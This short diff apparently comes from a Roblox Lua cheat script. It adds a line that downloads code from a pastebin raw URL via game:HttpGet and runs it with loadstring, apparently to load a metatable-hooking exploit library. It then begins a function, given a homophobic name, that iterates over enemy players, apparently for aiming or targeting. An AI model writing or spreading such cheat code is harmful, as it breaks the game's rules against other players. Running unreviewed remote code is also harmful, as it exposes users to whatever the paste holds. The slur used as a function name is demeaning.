@@ -1,3 +1,6 @@
+if not getgenv().MTAPIMutex then loadstring(game:HttpGet("https://pastebin.com/raw/UwFCVrhS", true))() end
+
+
 function imgay()
     for i,v in pairs(game.Players:GetChildren()) do
     if v and v.Character ~= nil and v ~= game.Players.LocalPlayer and v.TeamColor ~= game.Players.LocalPlayer.TeamColor then
